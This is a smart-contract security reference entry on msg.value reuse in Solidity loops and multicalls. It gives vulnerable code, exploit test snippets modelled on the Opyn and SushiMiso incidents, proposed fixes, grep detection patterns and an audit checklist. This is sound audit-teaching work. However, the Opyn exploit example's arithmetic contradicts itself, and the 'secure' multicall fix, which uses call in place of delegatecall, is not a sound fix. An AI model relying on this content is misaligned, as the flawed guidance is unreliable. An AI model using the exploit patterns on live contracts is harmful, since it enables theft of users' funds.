---
protocol: generic
chain: ethereum
category: msgvalue_loop
vulnerability_type: msg_value_reuse_in_loop

attack_type: economic_exploit
affected_component: batch_functions

primitives:
  - msg_value
  - loop_iteration
  - eth_payment
  - batch_operation
  - double_spending
  - payment_verification

severity: critical
impact: fund_loss
exploitability: 0.9
financial_impact: critical

tags:
  - msg_value
  - loop
  - double_spend
  - batch_mint
  - eth_payment
  - opyn
  - multi_call
  - real_exploit
  - defi
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 2
total_losses: "$371K + $3M saved"
---

## msg.value in Loop Vulnerability

### Overview

When `msg.value` is used as a payment check inside a loop or across multiple function calls within a single transaction, the same ETH is counted multiple times. `msg.value` is a transaction-level constant — it does not decrease when ETH is spent inside the transaction. This allows attackers to multiply their purchasing power: sending ETH once but executing multiple paid operations.

### Vulnerability Description

#### Root Cause

Solidity's `msg.value` is immutable for the duration of a transaction call. Unlike a local balance variable, it doesn't decrease when the contract transfers or uses ETH. Any function that validates payment with `require(msg.value >= price)` inside a loop will pass the check on every iteration with the same ETH.

This applies to:
1. **Direct loops**: `for` loops that check `msg.value` per iteration
2. **Batch functions**: Functions that iterate over arrays and check `msg.value` per element
3. **Multicall patterns**: `multicall()` or `batch()` that forward `msg.value` to each sub-call
4. **Internal function calls**: Functions that check `msg.value` called multiple times from a parent

#### Attack Scenario

**Opyn Protocol Pattern**:
1. Attacker calls `exercise(vaultIds, amountsToExercise)` with an array of 2+ vaults
2. Sends `msg.value` = payment for a single vault
3. Function iterates over each vault, checking `require(msg.value >= amountPerVault)`
4. Same `msg.value` passes the check for EVERY vault in the array
5. Attacker exercises options across multiple vaults while only paying once

---

### Vulnerable Pattern Examples

#### Category 1: msg.value Reuse in Loop Iteration [CRITICAL]

**Example 1: Opyn Protocol — Exercise Multiple Vaults with Single Payment (2020-08, ~$371K)** [CRITICAL]
```solidity
// ❌ VULNERABLE: msg.value checked per vault in a loop
interface IOToken {
    function exercise(
        uint256[] calldata vaultIds,
        uint256[] calldata amountsToExercise
    ) external payable;
}

// Internal implementation (simplified):
function exercise(
    uint256[] calldata vaultIds,
    uint256[] calldata amountsToExercise
) external payable {
    for (uint256 i = 0; i < vaultIds.length; i++) {
        uint256 vault = vaultIds[i];
        uint256 amount = amountsToExercise[i];

        // Calculate ETH cost for this vault's exercise
        uint256 ethCost = _calculateExerciseCost(vault, amount);

        // @audit msg.value is CONSTANT across all iterations!
        // First iteration: msg.value = 30 ETH, ethCost = 15 ETH → passes
        // Second iteration: msg.value = 30 ETH (unchanged!), ethCost = 15 ETH → ALSO passes
        require(msg.value >= ethCost, "insufficient payment");

        // Transfer underlying asset to exerciser
        _transferUnderlying(msg.sender, vault, amount);

        // @audit ETH "payment" not actually deducted from any running total
    }
}

// Attack execution from DeFiHackLabs PoC:
function testExploit() public {
    uint256[] memory vaultIds = new uint256[](2);
    vaultIds[0] = 1;  // First victim vault
    vaultIds[1] = 2;  // Second victim vault

    uint256[] memory amounts = new uint256[](2);
    amounts[0] = 15 ether;  // Exercise 15 ETH worth from vault 1
    amounts[1] = 15 ether;  // Exercise 15 ETH worth from vault 2

    // @audit Send only 30 ETH but exercise 30 ETH worth across 2 vaults
    // Without bug: would need 30 ETH (15 per vault) — correct
    // With bug: 30 ETH passes the check for BOTH iterations
    // Attacker pays 30 ETH but gets 60 ETH worth of underlying assets
    oToken.exercise{value: 30 ether}(vaultIds, amounts);
}
```
- **PoC**: `DeFiHackLabs/src/test/2020-08/Opyn_exp.sol`
- **Root Cause**: `exercise()` iterates over multiple vaults and checks `msg.value >= ethCost` per iteration. Since `msg.value` is constant, 30 ETH passes the check for vault 1 (15 ETH needed) AND vault 2 (15 ETH needed). Result: 30 ETH spent, 60 ETH worth of assets extracted.

---

#### Category 2: msg.value in Multicall / Batch [HIGH]

**Example 2: SushiMiso — Dutch Auction batch() ETH Commitment Multiplication (2021-09, ~$3M saved by whitehat)** [CRITICAL]
```solidity
// ❌ VULNERABLE: SushiMiso DutchAuction batch() forwards msg.value to each sub-call
// @PoC: DeFiHackLabs/src/test/2021-09/Sushimiso_exp.sol
interface IDutchAuction {
    function commitEth(
        address payable _beneficiary,
        bool readAndAgreedToMarketParticipationAgreement
    ) external payable;

    function batch(
        bytes[] calldata calls,
        bool revertOnFail
    ) external payable returns (bool[] memory successes, bytes[] memory results);
}

// @audit The batch() function internally delegatecalls commitEth() for each element
// Each delegatecall sees the FULL msg.value — so 100 ETH sent once
// gets credited 5 times (5 batch elements × 100 ETH = 500 ETH commitment)

// Attack execution:
function testExploit() public {
    bytes memory payload = abi.encodePacked(
        DutchAuction.commitEth.selector,
        uint256(uint160(address(this))),
        uint256(uint8(0x01))
    );

    bytes[] memory data = new bytes[](5);
    data[0] = payload;
    data[1] = payload;
    data[2] = payload;
    data[3] = payload;
    data[4] = payload;

    // @audit Send 100 ETH, but commitEth() is called 5 times with msg.value=100 ETH each
    // Result: 500 ETH worth of auction commitment for only 100 ETH
    DutchAuction.batch{value: 100 ether}(data, true);
}
```
- **PoC**: `DeFiHackLabs/src/test/2021-09/Sushimiso_exp.sol`
- **Root Cause**: SushiMiso's `batch()` function uses `delegatecall` internally. Each `commitEth()` sub-call sees the full `msg.value`, so the attacker's ETH commitment is multiplied by the number of batch elements. A whitehat rescued ~$3M by frontrunning the attacker.

**Example 3: Generic Multicall msg.value Double-Spend** [HIGH]
```solidity
// ❌ VULNERABLE: Multicall forwards msg.value to each sub-call
contract VulnerableMulticall {
    function multicall(bytes[] calldata data) external payable {
        for (uint256 i = 0; i < data.length; i++) {
            // @audit Each delegatecall sees the FULL msg.value
            (bool success,) = address(this).delegatecall(data[i]);
            require(success);
        }
    }

    function mint() external payable {
        require(msg.value >= MINT_PRICE, "insufficient payment");
        // @audit This check passes for every multicall iteration
        _mint(msg.sender, nextTokenId++);
    }
}

// Attack: batch N mints but only pay for 1
bytes[] memory calls = new bytes[](10);
for (uint i = 0; i < 10; i++) {
    calls[i] = abi.encodeWithSelector(this.mint.selector);
}
// @audit Send 1 MINT_PRICE, get 10 mints
vulnerableContract.multicall{value: MINT_PRICE}(calls);
```
- **Root Cause**: `multicall()` with `delegatecall` preserves `msg.value` across all sub-calls. Each `mint()` call sees the full `msg.value` and passes the payment check.

---

#### Category 3: msg.value in Payable Loop [HIGH]

**Example 3: Generic Batch Purchase Pattern** [HIGH]
```solidity
// ❌ VULNERABLE: Loop purchase checks msg.value per item
function batchPurchase(uint256[] calldata itemIds) external payable {
    for (uint256 i = 0; i < itemIds.length; i++) {
        uint256 price = items[itemIds[i]].price;
        // @audit Same msg.value passes check for EVERY item
        require(msg.value >= price, "underpaid");
        items[itemIds[i]].owner = msg.sender;
    }
}

// Attack: Buy N items for the price of 1
uint256[] memory ids = new uint256[](5);
ids[0] = 1; ids[1] = 2; ids[2] = 3; ids[3] = 4; ids[4] = 5;
// @audit Pay for 1 item, receive 5
contract.batchPurchase{value: singleItemPrice}(ids);
```

---

### Impact Analysis

#### Technical Impact
- **Payment Bypass**: Attackers pay once but execute multiple paid operations
- **Multiplied Purchasing Power**: N operations for the price of 1
- **Asset Drainage**: All assets in the iterated vaults/pools are extractable
- **Protocol Insolvency**: ETH reserves insufficient to cover all exercised positions

#### Business Impact
- **Opyn Impact**: $371K lost from exercised put option vaults
- **Widespread Pattern**: Any payable batch/loop function is potentially vulnerable
- **NFT/Mint Risk**: NFT minting contracts with batch functions are common targets
- **Protocol Solvency**: Under-collateralization from unpaid exercises

---

### Secure Implementation

**Fix 1: Track Running Payment Total**
```solidity
// ✅ SECURE: Accumulate total cost and compare to msg.value once
function exercise(
    uint256[] calldata vaultIds,
    uint256[] calldata amounts
) external payable {
    uint256 totalCost = 0;

    for (uint256 i = 0; i < vaultIds.length; i++) {
        uint256 ethCost = _calculateExerciseCost(vaultIds[i], amounts[i]);
        totalCost += ethCost;
        // @audit Accumulate, don't check per iteration
        _transferUnderlying(msg.sender, vaultIds[i], amounts[i]);
    }

    // @audit Single check at the end — total payment must cover all operations
    require(msg.value >= totalCost, "insufficient payment");

    // Refund excess
    if (msg.value > totalCost) {
        payable(msg.sender).transfer(msg.value - totalCost);
    }
}
```

**Fix 2: Deduct from Local Balance Variable**
```solidity
// ✅ SECURE: Track remaining balance locally
function batchPurchase(uint256[] calldata itemIds) external payable {
    uint256 remainingBalance = msg.value;

    for (uint256 i = 0; i < itemIds.length; i++) {
        uint256 price = items[itemIds[i]].price;
        // @audit Deduct from local variable, not msg.value
        require(remainingBalance >= price, "insufficient payment");
        remainingBalance -= price;
        items[itemIds[i]].owner = msg.sender;
    }

    // Refund unused balance
    if (remainingBalance > 0) {
        payable(msg.sender).transfer(remainingBalance);
    }
}
```

**Fix 3: Secure Multicall — Don't Forward msg.value**
```solidity
// ✅ SECURE: Only allow msg.value in first sub-call, or don't use delegatecall for payable
function multicall(bytes[] calldata data) external payable {
    for (uint256 i = 0; i < data.length; i++) {
        if (i == 0) {
            // @audit Only first call can use msg.value
            (bool success,) = address(this).delegatecall(data[i]);
            require(success);
        } else {
            // @audit Subsequent calls use regular call (msg.value = 0)
            (bool success,) = address(this).call(data[i]);
            require(success);
        }
    }
}
```

---

### Detection Patterns

```bash
# msg.value inside loop body
grep -B5 -A10 "for\s*(" --include="*.sol" | grep "msg.value"

# msg.value in functions called from loops
grep -rn "msg.value" --include="*.sol" | grep -v "//\|require.*==.*0"

# Payable functions with array parameters (batch operations)
grep -rn "function.*\[\].*external payable\|function.*\[\].*public payable" --include="*.sol"

# Multicall with delegatecall
grep -rn "delegatecall.*data\[" --include="*.sol"

# msg.value in require inside functions that may be called in a loop
grep -rn "require.*msg.value" --include="*.sol"
```

---

### Audit Checklist

1. **Is msg.value used inside any loop?** — Critical: same value is reused every iteration
2. **Is msg.value checked in a function that could be called via multicall/batch?** — The function gets the full msg.value each time
3. **Does the contract use delegatecall in a loop?** — delegatecall preserves msg.value context
4. **Is there a running total that deducts payments?** — Must use local variable, not msg.value
5. **Are there batch/array purchase functions that are payable?** — Each element must deduct from a running total
6. **Is excess ETH refunded correctly?** — Calculate total cost first, refund difference

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain |
|----------|------|------|---------------|-------|
| Opyn Protocol | 2020-08 | $371K | exercise() iterates vaults, checks msg.value per vault | Ethereum |
| SushiMiso | 2021-09 | ~$3M (saved) | batch() delegatecalls commitEth() with reused msg.value | Ethereum |

---

### DeFiHackLabs PoC References

- **Opyn Protocol** (2020-08, $371K): `DeFiHackLabs/src/test/2020-08/Opyn_exp.sol`
- **SushiMiso** (2021-09, ~$3M saved): `DeFiHackLabs/src/test/2021-09/Sushimiso_exp.sol`

---

### Keywords

- msg_value
- msg_value_loop
- double_spend
- batch_payment
- multicall
- delegatecall
- payment_loop
- exercise_loop
- opyn
- sushimiso
- dutch_auction
- commitEth
- batch_delegatecall
- payable_loop
- eth_payment_reuse
- DeFiHackLabs

---

### Related Vulnerabilities

- [Reentrancy Patterns](../../general/reentrancy/) — ETH handling vulnerabilities
- [Flash Loan Attacks](../../general/flash-loan-attacks/) — Capital amplification patterns
